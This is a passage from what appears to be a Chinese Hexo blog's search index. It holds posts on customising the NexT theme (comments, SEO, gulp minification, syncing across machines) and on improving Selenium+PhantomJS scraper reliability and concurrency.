&#123; color: #a3d2a3; text-decoration: underline;&#125;.my_post_copyright:hover .fa-clipboard &#123; color: #000;&#125;.my_post_copyright .post-url:hover &#123; font-weight: normal;&#125;.my_post_copyright .copy-path &#123; margin-left: 1em; width: 1em; +mobile()&#123;display:none;&#125;&#125;.my_post_copyright .copy-path:hover &#123; color: #808080; cursor: pointer;&#125; 修改next/layout/_macro/post.swig，在代码12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'wechat-subscriber.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; 之前添加增加如下代码：12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'my-copyright.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; 修改next/source/css/_common/components/post/post.styl文件，在最后一行增加代码：1@import "my-post-copyright" 如果要在该博文下面增加版权信息的显示，需要在 Markdown 中增加copyright: true的设置，类似：1234567---title: date: tags: categories: copyright: true--- 自定义hexo new生成md文件的选项在/scaffolds/post.md文件中添加：12345678910---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;tags:categories: copyright: truepermalink: 01top: 0password:--- 隐藏网页底部powered By Hexo / 强力驱动打开themes/next/layout/_partials/footer.swig,使用””隐藏之间的代码即可，或者直接删除。123456789101112&lt;!--&lt;div class="powered-by"&gt; &#123;&#123; __('footer.powered', '&lt;a class="theme-link" rel="external nofollow" href="https://hexo.io"&gt;Hexo&lt;/a&gt;') &#125;&#125;&lt;/div&gt;&lt;div class="theme-info"&gt; &#123;&#123; __('footer.theme') &#125;&#125; - &lt;a class="theme-link" rel="external nofollow" href="https://github.com/iissnan/hexo-theme-next"&gt; NexT.&#123;&#123; theme.scheme &#125;&#125; &lt;/a&gt;&lt;/div&gt;--&gt; 文章加密访问打开themes-&gt;next-&gt;layout-&gt;_partials-&gt;head.swig文件,在meta标签后面插入这样一段代码：12345678910&lt;script&gt; (function()&#123; if('&#123;&#123; page.password &#125;&#125;')&#123; if (prompt('请输入文章密码') !== '&#123;&#123; page.password &#125;&#125;')&#123; alert('密码错误！'); history.back(); &#125; &#125; &#125;)();&lt;/script&gt; 然后文章中添加：1password: nmask 如果password后面为空，则表示不用密码。 博文置顶修改 hero-generator-index 插件，把文件：node_modules/hexo-generator-index/lib/generator.js 内的代码替换为：12345678910111213141516171819202122232425262728'use strict';var pagination = require('hexo-pagination');module.exports = function(locals)&#123; var config = this.config; var posts = locals.posts; posts.data = posts.data.sort(function(a, b) &#123; if(a.top &amp;&amp; b.top) &#123; // 两篇文章top都有定义 if(a.top == b.top) return b.date - a.date; // 若top值一样则按照文章日期降序排 else return b.top - a.top; // 否则按照top值降序排 &#125; else if(a.top &amp;&amp; !b.top) &#123; // 以下是只有一篇文章top有定义，那么将有top的排在前面（这里用异或操作居然不行233） return -1; &#125; else if(!a.top &amp;&amp; b.top) &#123; return 1; &#125; else return b.date - a.date; // 都没定义按照文章日期降序排 &#125;); var paginationDir = config.pagination_dir || 'page'; return pagination('', posts, &#123; perPage: config.index_generator.per_page, layout: ['index', 'archive'], format: paginationDir + '/%d/', data: &#123; __index: true &#125; &#125;);&#125;; 在文章中添加 top 值，数值越大文章越靠前，如:12345---......copyright: truetop: 100--- 默认不设置则为0，数值相同时按时间排序。 添加顶部加载条打开/themes/next/layout/_partials/head.swig文件，在maximum-scale=1”/&gt;后添加如下代码:12&lt;script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"&gt;&lt;/script&gt;&lt;link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet"&gt; 但是，默认的是粉色的，要改变颜色可以在/themes/next/layout/_partials/head.swig文件中添加如下代码（接在刚才link的后面）12345678910111213&lt;style&gt; .pace .pace-progress &#123; background: #1E92FB; /*进度条颜色*/ height: 3px; &#125; .pace .pace-progress-inner &#123; box-shadow: 0 0 10px #1E92FB, 0 0 5px #1E92FB; /*阴影颜色*/ &#125; .pace .pace-activity &#123; border-top-color: #1E92FB; /*上边框颜色*/ border-left-color: #1E92FB; /*左边框颜色*/ &#125;&lt;/style&gt; 添加热度next主题集成leanCloud，打开/themes/next/layout/_macro/post.swig在”leancloud-visitors-count”&gt;标签后面添加℃。然后打开，/themes/next/languages/zh-Hans.yml，将visitors内容改为热度即可。 主页文章添加阴影效果打开\themes\next\source\css_custom\custom.styl,向里面加入：12345678// 主页文章添加阴影效果 .post &#123; margin-top: 60px; margin-bottom: 60px; padding: 25px; -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5); -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5); &#125; 修改文章底部的那个带#号的标签修改模板/themes/next/layout/_macro/post.swig，搜索 rel=”tag”&gt;#，将 # 换成 鼠标点击小红心的设置将 love.js 文件添加到 \themes\next\source\js\src 文件目录下。找到 \themes\next\layout_layout.swing 文件， 在文件的后面， 标签之前 添加以下代码：12&lt;!-- 页面点击小红心 --&gt;&lt;script type="text/javascript" src="/js/src/love.js"&gt;&lt;/script&gt; 背景的设置将 particle.js 文件添加到 \themes\next\source\js\src 文件目录下。找到 \themes\next\layout_layout.swing 文件， 在文件的后面，标签之前 添加以下代码：12&lt;!-- 背景动画 --&gt;&lt;script type="text/javascript" src="/js/src/particle.js"&gt;&lt;/script&gt; 修改文章内链接文本样式将链接文本设置为蓝色，鼠标划过时文字颜色加深，并显示下划线。找到文件 themes\next\source\css\_custom\custom.styl ，添加如下 css 样式：12345678.post-body p a &#123; color: #0593d3; border-bottom: none; &amp;:hover &#123; color: #0477ab; text-decoration: underline; &#125;&#125; 博文压缩在站点的根目录下执行以下命令：12$ npm install gulp -g$ npm install gulp-minify-css gulp-uglify gulp-htmlmin gulp-htmlclean gulp --save 在博客根目录下新建 gulpfile.js ，并填入以下内容：123456789101112131415161718192021222324252627282930313233var gulp = require('gulp');var minifycss = require('gulp-minify-css');var uglify = require('gulp-uglify');var htmlmin = require('gulp-htmlmin');var htmlclean = require('gulp-htmlclean');// 压缩 public 目录 cssgulp.task('minify-css', function() &#123; return gulp.src('./public/**/*.css') .pipe(minifycss()) .pipe(gulp.dest('./public'));&#125;);// 压缩 public 目录 htmlgulp.task('minify-html', function() &#123; return gulp.src('./public/**/*.html') .pipe(htmlclean()) .pipe(htmlmin(&#123; removeComments: true, minifyJS: true, minifyCSS: true, minifyURLs: true, &#125;)) .pipe(gulp.dest('./public'))&#125;);// 压缩 public/js 目录 jsgulp.task('minify-js', function() &#123; return gulp.src('./public/**/*.js') .pipe(uglify()) .pipe(gulp.dest('./public'));&#125;);// 执行 gulp 命令时执行的任务gulp.task('default', [ 'minify-html','minify-css','minify-js']); 生成博文是执行 hexo g &amp;&amp; gulp 就会根据 gulpfile.js 中的配置，对 public 目录中的静态资源文件进行压缩。 搜索功能安装 hexo-generator-searchdb，在站点的根目录下执行以下命令：1$ npm install hexo-generator-searchdb --save 编辑 站点配置文件，新增以下内容到任意位置：12345search: path: search.xml field: post format: html limit: 10000 增加阅读排行统计页面首先我们可以使用leancloud来统计页面阅读数量，以及储存这些信息，然后通过leancloud提供的api编写js脚本来获取阅读数量信息，并展示在页面上。首先新建一个page页面，hexo new page “”,然后编辑此.md文件，写下：1234567891011121314151617181920212223242526&lt;script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"&gt;&lt;/script&gt;&lt;script&gt;AV.initialize("", "");&lt;/script&gt; //需要写上leancloud的key&lt;script type="text/javascript"&gt; var time=0 var title="" var url="" var query = new AV.Query('Counter');//表名 query.notEqualTo('id',0); //id不为0的结果 query.descending('time'); //结果按阅读次数降序排序 query.limit(20); //最终只返回10条结果 query.find().then(function (todo) &#123; for (var i=0;i&lt;10;i++)&#123; var result=todo[i].attributes; time=result.time; //阅读次数 title=result.title; //文章标题 url=result.url; //文章url var content="&lt;p&gt;"+"&lt;font color='#0477ab'&gt;"+"【阅读次数:"+time+"】"+"&lt;a href='"+"http://thief.one"+url+"'&gt;"+title+"&lt;/font&gt;"+"&lt;/a&gt;"+"&lt;/p&gt;"; // document.write("&lt;a href='"+"http://thief.one/"+url+"'&gt;"+title+"&lt;/a&gt;"+" Readtimes:"+time+"&lt;br&gt;"); document.getElementById("heheda").innerHTML+=content &#125; &#125;, function (error) &#123; console.log("error"); &#125;);&lt;/script&gt; 最终的效果查看：http://thief.one/count 多说替换成来必力评论更新于@2017年5月18日多说已经宣布下线了，因此我找了个来必力评论系统来替换，以下是替换的教程，教程内容来自：https://blog.smoker.cc/web/add-comments-livere-for-hexo-theme-next.html 来必力评价优点：界面美观缺点：不支持数据导入，加载慢 首先在 _config.yml 文件中添加如下配置：1livere_uid: your uid 其中 livere_uid 即注册来必力获取到的 uid。在 layout/_scripts/third-party/comments/ 目录中添加 livere.swig，文件内容如下：1234567891011121314&#123;% if not (theme.duoshuo and theme.duoshuo.shortname) and not theme.duoshuo_shortname and not theme.disqus_shortname and not theme.hypercomments_id and not theme.gentie_productKey %&#125; &#123;% if theme.livere_uid %&#125; &lt;script type="text/javascript"&gt; (function(d, s) &#123; var j, e = d.getElementsByTagName(s)[0]; if (typeof LivereTower === 'function') &#123; return; &#125; j = d.createElement(s); j.src = 'https://cdn-city.livere.com/js/embed.dist.js'; j.async = true; e.parentNode.insertBefore(j, e); &#125;)(document, 'script'); &lt;/script&gt; &#123;% endif %&#125;&#123;% endif %&#125; 优先使用其他评论插件，如果其他评论插件没有开启，且LiveRe评论插件配置开启了，则使用LiveRe。其中脚本代码为上一步管理页面中获取到的。在layout/_scripts/third-party/comments.swig文件中追加：1&#123;% include './comments/livere.swig' %&#125; 引入 LiveRe 评论插件。最后，在 layout/_partials/comments.swig 文件中条件最后追加LiveRe插件是否引用的判断逻辑：123&#123;% elseif theme.livere_uid %&#125; &lt;div id="lv-container" data-id="city" data-uid="&#123;&#123; theme.livere_uid &#125;&#125;"&gt;&lt;/div&gt;&#123;% endif %&#125; 最后打开博客瞧瞧吧！ 多说替换成网易云跟贴最好的方法就是更新next主题，因为最新版本的主题已经支持这几种评论。如果不想更新主题，则往下看： 网易云跟贴评价：性能稳定，功能中规中矩，支持数据导入 首先在 _config.yml 文件中添加如下配置：1gentie_productKey: #your-gentie-product-key 其中 gentie_productKey 即注册网易云跟贴获取到的key。在 layout/_scripts/third-party/comments/ 目录中添加 gentie.swig，文件内容如下：12345678910111213141516&#123;% if not (theme.duoshuo and theme.duoshuo.shortname) and not theme.duoshuo_shortname and not theme.disqus_shortname and not theme.hypercomments_id %&#125; &#123;% if theme.gentie_productKey %&#125; &#123;% set gentie_productKey = theme.gentie_productKey %&#125; &lt;script&gt; var cloudTieConfig = &#123; url: document.location.href, sourceId: "", productKey: "&#123;&#123;gentie_productKey&#125;&#125;", target: "cloud-tie-wrapper" &#125;; &lt;/script&gt; &lt;script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"&gt;&lt;/script&gt; &#123;% endif %&#125;&#123;% endif %&#125; 在layout/_scripts/third-party/comments.swig文件中追加：1&#123;% include './comments/gentie.swig' %&#125; 最后，在 layout/_partials/comments.swig 文件中条件最后追加网易云跟帖插件引用的判断逻辑：123&#123;% elseif theme.gentie_productKey %&#125; &lt;div id="cloud-tie-wrapper" class="cloud-tie-wrapper"&gt; &lt;/div&gt; 报错解决（一）Deployer not found: git当编辑__config.yml文件，将type: git设置完成后，运行hexo g 报错：git not found解决方案：可以在MyBlog目录下运行: npm install hexo-deployer-git –save。 （二）permission denied当执行: hexo deploy 报错时，把__config.yml中的github连接形式从ssh改成http。 （三）当在themes目录下载主题时，报错。将该目录只读属性取消。 （四）genrnate 报错检查_config.yml配置中，键值对冒号后面是否已经预留了一个半角空格。 （五）ERROR Plugin load failed: hexo-generator-feed12npm install hexo-generator-feednpm install hexo-generator-feed --save （六）fatal: The remote end hung up unexpectedly123$ git config https.postBuffer 524288000$ git config http.postBuffer 524288000$ git config ssh.postBuffer 524288000 （七）hero d推送的内容有问题 首先检查下.deploy_git文件夹下的.git文件是否存在，此.git文件指定了hexo d时推送public文件夹，而不是所有的内容。如果此.git文件不存在，则会出现推送内容错误。 用npm install hexo-deployer-git –save生成的.deploy_git不包含.git文件，因此正确的做法是.deploy_git文件夹也需要备份，然后再用npm install hexo-deployer-git –save更新一下其内容即可。 如果已经出现这个错误，则删除.deploy_git，重新hexo d。 （八）hexo s报错在新版本的mac上，安装运行hexo会报此错误，但不影响使用。1&#123; Error: Cannot find module 解决方案：1npm install hexo --no-optional Local Search错误 最近发现Local Search搜索出来的连接有错误，到不是说连接不对，而是当我在/aaa/目录下搜索一个页面时，跳转到了/aaa/正确的连接/，这样明显是正确的，应该是跟目录+跳转的目录。 网上搜索了下，没有类似的案例，那么自己动手修改吧，打开node_modules/hexo-generator-searchdb/templates下的xml.ejs文件：1&lt;url&gt;&lt;%- ("../../../../../../../../"+post.path) %&gt;&lt;/url&gt; 说明：将这个文件的两处url都改成这样就可以了。 异地同步博客内容 现在电脑已经很普及了，因为一般来说我们都是公司一台电脑，家里一台电脑，那么如何将两台电脑上博客的内容同步内，即两台电脑上都可以编辑更新博客？要解决这个问题，首先我们要清楚我们博客文件的组成： node_modules public scaffolds source themes _config_yml db.json package.json .deploy_git 以上为利用hexo生成的博客全部内容，那么当我们执行hexo d时，正真被推送到github上的又有哪些内容呢？ 我们可以看下github上的tengzhangchao.github.io项目，发现里面只有Public目录下的内容。也就是说，我们博客上呈现的内容，其实就是public下的文件内容。那么这个Pulic目录是怎么生成的呢？ 一开始hexo init的时候是没有public目录的，而当我们运行hexo g命令时，public目录被生成了，换句话说hexo g命令就是用来生成博客文件的（会根据_config.yml，source目录文件以及themes目录下文件生成）。同样当我们运行hexo clean命令时，public目录被删除了。 好了，既然我们知道了决定博客显示内容的只有一个Public目录，而public目录又是可以动态生成的，那么其实我们只要在不同电脑上同步可以生成Public目录的文件即可。 以下文件以及目录是必须要同步的： source themes _config.yml db.json package.json .deploy_git 同步的方式有很多种，可以每次更新后都备份到一个地址。我采用github去备份，也就是新建一个项目用来存放以上文件，每次更新后推送到github上，用作备份同步。 同步完必须的文件后，怎么再其他电脑上也可以更新博客呢？ 前提假设我们现在配置了一台新电脑，里面没有安装任何有关博客的东西，那么我们开始吧： 下载node.js并安装（官网下载安装），默认会安装npm。 下载安装git（官网下载安装） 下载安装hexo。方法：打开cmd 运行npm install -g hexo（要翻墙） 新建一个文件夹，如MyBlog 进入该文件夹内，右击运行git，输入：hexo init（生成hexo模板，可能要翻墙) 我们重复了一开始搭建博客的步骤，重新生成了一个新的模板，这个模板中包含了hexo生成的一些文件。 git clone 我们备份的项目，生成一个文件夹，如：MyBlogData 将MyBlog里面的node_modules、scaffolds文件夹复制到MyBlogData里面。 做完这些，从表面上看，两台电脑上MyBlogData目录下的文件应该都是一样的了。那么我们运行hexo ghexo d试试，如果会报错，则往下看。 这是因为.deploy_git没有同步，在MyBlogData目录内运行:npm install hexo-deployer-git –save后再次推送即可 总结流程：当我们每次更新MyBlog内容后，先利用hexo将public推送到github，然后再将其余必须同步的文件利用git推送到github。 SEO优化seo优化对于网站是否能被搜索引擎快速收录有很大帮助，因此适当做一些seo还是有必要的，以下内容参考：https://lancelot_lewis.coding.me/2016/08/16/blog/Hexo-NexT-SEO/ 添加sitemap文件安装以下2个插件，然后重启hexo后，网站根目录（source）下会生成sitemap.xml与baidusitemap.xml文件，搜索引擎在爬取时会参照文件中的url去收录。1234npm install hexo-generator-sitemap --save-devhexo d -gnpm install hexo-generator-baidu-sitemap --save-devhexo d -g 添加robots.txt新建robots.txt文件，添加以下文件内容，把robots.txt放在hexo站点的source文件下。1234567891011User-agent: * Allow: /Allow: /archives/Disallow: /vendors/Disallow: /js/Disallow: /css/Disallow: /fonts/Disallow: /vendors/Disallow: /fancybox/Sitemap: http://thief.one/sitemap.xmlSitemap: http://thief.one/baidusitemap.xml 首页title的优化更改index.swig文件，文件路径是your-hexo-site\themes\next\layout，将下面代码1&#123;% block title %&#125; &#123;&#123; config.title &#125;&#125; &#123;% endblock %&#125; 改成1&#123;% block title %&#125; &#123;&#123; config.title &#125;&#125; - &#123;&#123; theme.description &#125;&#125; &#123;% endblock 观察首页title就是标题+描述了。 MakeDown语法123456789101112131415161718[hexo](http://www.baidu.com) 表示超链接##大标题###小标题&lt;!-- more --&gt;&lt;!-- 标签别名 --&gt;&#123;% cq %&#125;blah blah blah&#123;% endcq %&#125;空格 中文全角空格表示---文章标题---&gt;内容 区块引用*1*2*3列表*内容* 表示强调内容![Alt text](/path/to/img.jpg) 图片![](/upload_image/20161012/1.png) 详细Markdown语法请参考：MakeDown语法 参考文章http://www.jianshu.com/p/f054333ac9e6https://neveryu.github.io/2016/09/30/hexo-next-two/ 提醒：在更新博客内容时，最好先在本地调试完毕后（hexo server），再推送到github上。]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>博客搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【phantomjs系列】Selenium+Phantomjs爬过的那些坑]]></title>
    <url>../../../../../../../../2017/03/01/Phantomjs爬过的那些坑/</url>
    <content type="text"><![CDATA[技术的探索就是不断提出假设，然后不断去推翻它最近在跟同事使用phantomjs编写爬虫时，遇到了很多有意思的坑，我们在分析了一番后得出了一些结论以及解决方案，此分享一下。 事情的起因，是因为我们要利用phantomjs访问一批网站获取源码以及url，然后当我们查看输出结果时却发现请求的url与访问后获取的url并不对应，比如我用phantomjs访问baidu，返回的结果却显示当前url是bing。由此引发了我们一系列的猜想，由于这方面互联网上的资源比较少，因此也只能自己猜测并动手验证了。 对于结果值不对应问题，我暂时定义为，phantomjs状态被污染或者覆盖。简单来说，我们先去访问a网站，获取结果后，我们又访问了b网站，然后获取b网站的结果，然而我们发现b网站的结果却是a网站。那么我们首先认为，phantomjs再处理b网站时，本身的状态没有被更新，导致获取b网站的结果仍然为a网站。 那么是什么原因导致phantomjs状态未更新呢？ 我同事的博客中详细介绍了2种原因，详情请看：https://eth.space/phantomjs-debug/，这里便不再重复。 作为补充说明，我这边贴出测试代码，以供参考 phantomjs状态污染测试测试代码1234567891011d=webdriver.PhantomJS("D:\python27\Scripts\phantomjs.exe",service_args=['--load-images=no','--disk-cache=yes'])d.implicitly_wait(10) ##设置超时时间d.set_page_load_timeout(10) ##设置超时时间def gethttp(url): try: d.get(url) except Exception,e: print e print d.current_url 测试（一）当我们先用phantomjs运行了cn.bing.com，然后运行123.114.com网站，注意123.114.com是访问不了的.12gethttp("http://cn.bing.com") #网站能正常打开gethttp("http://123.114.com") #DNS解析失败，网站打不开 执行结果：12http://cn.bing.com/http://cn.bing.com/ 可以看到我们获取123.114.com网站的信息时竟然返回了cn.bing.com。 测试（二）当我们访问一个网页源码里面带有onbeforeunload元素的网页时。12gethttp("http://www.zzxzxyey.com") #网页内存在onbeforeunload元素gethttp("http://cn.bing.com") #网站能正常打开 执行结果：12http://www.zzxzxyey.com/http://www.zzxzxyey.com/ 可以看到以上2种情况，都会导致phantomjs状态污染，至于其他情况还待后期观察测试。 解决方案彻底法每次d.get()请求完就d.quit()关闭phantomjs进程，待到新的请求再开启。（非常耗资源） 普通法每次get前去判断url是否能被dns解析，url是否能打开。（也有点耗资源） 优雅法每次get后，保存current_url的值，待下一次请求后与此值相比较，如果一样，则说明状态没有被改变。（当然，有些特殊情况除外，比如每次get的网站都是同一个，或者批量get的网站中有相同地址的。） 超神法每次get一个目标url以后，再去访问下get(“about:blank”)，重置下状态。 传送门 【phantomjs系列】phantomjs正确打开方式【phantomjs系列】phantomjs api介绍【phantomjs系列】selenium+phantomjs爬过的那些坑【phantomjs系列】selenium+phantomjs性能优化]]></content>
      <categories>
        <category>爬虫技术</category>
      </categories>
      <tags>
        <tag>Phantomjs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【phantomjs系列】Selenium+Phantomjs性能优化]]></title>
    <url>../../../../../../../../2017/03/01/Phantomjs性能优化/</url>
    <content type="text"><![CDATA[人生之路需要坚持，技术之道亦然写过爬虫的朋友应该都用过一个无头浏览器–phantomjs，使用它的原因很简单明了：能够高度模拟浏览器访问（对抗反爬虫），无头浏览（可以节省性能）。Phantomjs应用最广泛的应该还是用来执行js代码，比如写一个js脚本，利用phantomjs去执行，可以写一个页面截图、网页性能测试等等功能的。 phantomjs也是爬虫界的一大神器，我最初使用它就是用来爬取一些动态加载的网页，效果俱佳。当然Phantomjs也不是完美无缺的，虽然作为无头浏览器其性能已经比其他基于浏览器内核的工具快多了，但跟普通的爬虫相比，速度仍是相差甚远。 关于phantomjs的安装使用网上一大推，这里也不在重复介绍，本篇文章重点在于介绍Phantomjs性能优化问题。因为我比较熟悉python语言，因此就借助此语言谈谈Phantomjs的性能优化功法。 基础篇（设置参数功法） Python中使用Phantomjs需要借助Selenium模块，Selenium本身也是用来做Web自动化测试的，正好封装了Phantomjs，因此我们可以借助它来使用Phantomjs。具体安装方法，这里不再介绍，Phantomjs在启动时可以设置参数，那么来看看如何通过设置参数，达到优化性能的目的。 代码测试访问单个网站的速度 默认配置：12345from selenium import webdriverd=webdriver.PhantomJS("D:\python27\Scripts\phantomjs.exe",service_args=[])d.get("http://thief.one")d.quit() 测试结果：3.2s 修改配置：12345678910from selenium import webdriverservice_args=[]service_args.append('--load-images=no') ##关闭图片加载service_args.append('--disk-cache=yes') ##开启缓存service_args.append('--ignore-ssl-errors=true') ##忽略https错误d=webdriver.PhantomJS("D:\python27\Scripts\phantomjs.exe",service_args=service_args)d.get("http://thief.one")d.quit() 测试结果：2.9s 说明：从单个网站来看，合理设置参数可以提速0.3s（如果网站上图片等资源较多，则提升的效果会更明显）。 设置超时 当利用爬虫访问一批网站时，遇到加载慢的网站往往会阻塞很久，遇到打不开的网站则会一直阻塞，严重影响了爬虫的性能，我们知道一般的爬虫，例如requests、urllib等模块可以设置timeout，也就是超时时间，phantomjs同样可以设置。123456789101112from selenium import webdriverservice_args=[]service_args.append('--load-images=no')service_args.append('--disk-cache=yes')service_args.append('--ignore-ssl-errors=true')d=webdriver.PhantomJS("D:\python27\Scripts\phantomjs.exe",service_args=service_args)d.implicitly_wait(10) ##设置超时时间d.set_page_load_timeout(10) ##设置超时时间d.get("http://www.baidu.com")d.quit() 说明：如果phantomjs加载时间超过10s，则会触发异常。（虽然触发异常，但current_url仍然可以用来获取当前url，源码也可以获取，只不过是没有加载完全的源码。当然只针对加载慢的网站，完全无法访问的网站除外。） 中级篇（合理开关） 在我使用phantomjs的一段时间内，通过不断调试，我发现phantomjs主要的性能消耗在于phantomjs进程的开启上。因为在python中使用phantomjs，相当于开启并调用phantomjs.exe（windows）执行一些操作，因此如果频繁的开启关闭phantomjs进程，则会非常消耗性能，因此要合理操作开关。 代码测试单线程访问百度10次： 优化前：1234567891011121314151617from selenium import webdriverdef phantomjs_req(url): service_args=[] service_args.append('--load-images=no') service_args.append('--disk-cache=yes') service_args.append('--ignore-ssl-errors=true') d=webdriver.PhantomJS("D:\python27\Scripts\phantomjs.exe",service_args=service_args) d.get(url) print d.current_url d.quit()url_list=["http://www.baidu.com"]*10for i in url_list: phantomjs_req(i) 测试结果：28.2s，运行过程中,phantomjs进程不断开关。 优化后：1234567891011121314151617from selenium import webdriverdef phantomjs_req(url): d.get(url) print d.current_urlservice_args=[]service_args.append('--load-images=no')service_args.append('--disk-cache=yes')service_args.append('--ignore-ssl-errors=true')d=webdriver.PhantomJS("D:\python27\Scripts\phantomjs.exe",service_args=service_args)url_list=["http://www.baidu.com"]*10for i in url_list: phantomjs_req(i)d.quit() 测试结果：4.2s 说明：可以看到优化前与优化后代码的区别，在于将phantomjs开启关闭的操作放到了循环外面，使它始终只开关一次。可以看到性能的差别非常大，因此也可以看出phantomjs开关过程非常消耗时间。 注意：此方法虽然节省了很大的开支，但会引起另外一个phantomjs的Bug（暂且称之为Bug），也就是phantomjs状态覆盖问题。当批量去访问一些网站时，会发现返回的结果与请求的网站不对应。关于此问题，请移步Phantomjs爬过的那些坑。 高级篇（phantomjs并发问题） 通过前面的优化，我们发现phantomjs的性能提高了很多，但即便如此，以上代码也只是实现了单线程中的优化。当遇到大批量的网站时，并发是必须的选择，那么Phantomjs在并发中又改如何使用与优化呢？ 优化之路在优化phantomjs并发性能的问题上，我也并没有一帆风顺，期间查阅了很多资料，也踩过了很多的坑。 不成熟的优化（一）起初我用了最直接了当的方法，企图开启phantomjs并发的性能。（运行一个phantomjs进程，进程内开启多线程）12345678d=webdriver.PhantomJS() def test(url): d.get(url)url_list=["http://www.baidu.com"]*10for url in url_list: threading.Thread(target=test,args=(url,)).start() d.quit() 然而运行连连出错，在查看了官网等资料后发现phantomjs是单线程的，因此如果按照上面的写法，那么不能使用多线程同时去执行，此次优化失败！ 不成熟的优化（二）既然一个phantomjs只能支持单线程，那么我就开启多个phantomjs。12345678def test(url): d=webdriver.PhantomJS() d.get(url) d.quit()url_list=["http://www.baidu.com"]*10for url in url_list: threading.Thread(target=test,args=(url,)).start() 终于我看到同时10个phantomjs进程被开启了，10个网站的请求可以并发执行了。然而当网站的数量为50个时，要同时运行50个phantomjs进程？No，这必定会搞垮服务器，此次优化失败！ 不成熟的优化（三） 经过以上2次失败，我开始思考，如何只开启10个phantomjs进程，然后每个phantomjs进程按顺序执行请求网站的操作呢?这样就相当于10个进程并发执行了。终于在某个夜晚，我想出了以下代码：123456789def test(): d=webdriver.PhantomJS() for i in url_list: d.get(url) d.quit()url_list=["http://www.baidu.com"]*50for i in range(10): threading.Thread(target=test).start() 成功开启了10个phantomjs进程，每个进程按顺序执行了50个网站的请求。等等，貌似这样设计，每个phantomjs进程都会去访问50次百度，这不是最初的要求，oh，No！ 不算成熟但还可以的优化 在第三阶段并发优化的雏形已经出来了，只不过还需要解决一个多线程共享资源的问题，这个可以用Queue模块解决。那么直接看优化后并发的代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102__author__="nMask"__Date__="20170224"__Blog__="http://thief.one"import Queuefrom selenium import webdriverimport threadingimport timeclass conphantomjs: phantomjs_max=1 ##同时开启phantomjs个数 jiange=0.00001 ##开启phantomjs间隔 timeout=20 ##设置phantomjs超时时间 path="D:\python27\Scripts\phantomjs.exe" ##phantomjs路径 service_args=['--load-images=no','--disk-cache=yes'] ##参数设置 def __init__(self): self.q_phantomjs=Queue.Queue() ##存放phantomjs进程队列 def getbody(self,url): ''' 利用phantomjs获取网站源码以及url ''' d=self.q_phantomjs.get() try: d.get(url) except: print "Phantomjs Open url Error" url=d.current_url self.q_phantomjs.put(d) print url def open_phantomjs(self): ''' 多线程开启phantomjs进程 ''' def open_threading(): d=webdriver.PhantomJS(conphantomjs.path,service_args=conphantomjs.service_args) d.implicitly_wait(conphantomjs.timeout) ##设置超时时间 d.set_page_load_timeout(conphantomjs.timeout) ##设置超时时间 self.q_phantomjs.put(d) #将phantomjs进程存入队列 th=[] for i in range(conphantomjs.phantomjs_max): t=threading.Thread(target=open_threading) th.append(t) for i in th: i.start() time.sleep(conphantomjs.jiange) #设置开启的时间间隔 for i in th: i.join() def close_phantomjs(self): ''' 多线程关闭phantomjs对象 ''' th=[] def close_threading(): d=self.q_phantomjs.get() d.quit() for i in range(self.q_phantomjs.qsize()): t=threading.Thread(target=close_threading) th.append(t) for i in th: i.start() for i in th: i.join()if __name__=="__main__": ''' 用法： 1.实例化类 2.运行open_phantomjs 开启phantomjs进程 3.运行getbody函数，传入url 4.运行close_phantomjs 关闭phantomjs进程 ''' cur=conphantomjs() conphantomjs.phantomjs_max=10 cur.open_phantomjs() print "phantomjs num is ",cur.q_phantomjs.qsize() url_list=["http://www.baidu.com"]*50 th=[] for i in url_list: t=threading.Thread(target=cur.getbody,args=(i,)) th.append(t) for i in th: i.start() for i in th: i.join() cur.close_phantomjs() print "phantomjs num is ",cur.q_phantomjs.qsize() 代码测试：利用单线程优化后的代码访问50次百度：10.3s。利用10个phantomjs并发访问50次百度：8.1s 说明：并发优化后的代码同时开启了10个phantomjs进程，用于处理50次访问百度的请求。由于一个phantomjs同一时间不能处理2个url，也就是说不支持多线程处理，因此开启10个phantomjs进程就相当于程序的并发数量为10。如果除去开启10个phantomjs耗费的时间，总共执行50次访问的时间也就2s左右，速度快了不少。 终极篇 高级篇中解决并发效率，我用的实际上是多进程，无论python同时开启多少个线程去让phantomjs进程执行操作，一个phantomjs进程同时也只能执行一个访问请求。因此并发的数量取决于开启phantomjs的数量，而phantomjs又是以进程的形式去运行的。 既然知道了性能的瓶颈所在，那么终极篇中，我们可以使用分布式+phantomjs多进程并发来提高性能。 替代方案以上的优化方案并不能从根本上解决phantomjs性能问题，更好的替代方案请移步：Phantomjs正确打开方式 传送门 【phantomjs系列】phantomjs正确打开方式【phantomjs系列】phantomjs api介绍【phantomjs系列】selenium+phantomjs爬过的那些坑【phantomjs系列】selenium+phantomjs性能优化]]></content>
      <categories>
        <category>爬虫技术</category>
      </categories>
      <tags>
        <tag>Phantomjs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Shadowsocks折腾记]]></title>
    <url>../../../../../../../../2017/02/22/Shadowsocks折腾记/</url>
    <content type="text"><![CDATA[由于某种原因，该文章内容已下线]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>shadowsocks</tag>
        <tag>shadowsocks搭建教程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python协程]]></title>
    <url>../../../../../../../../2017/02/20/Python协程/</url>
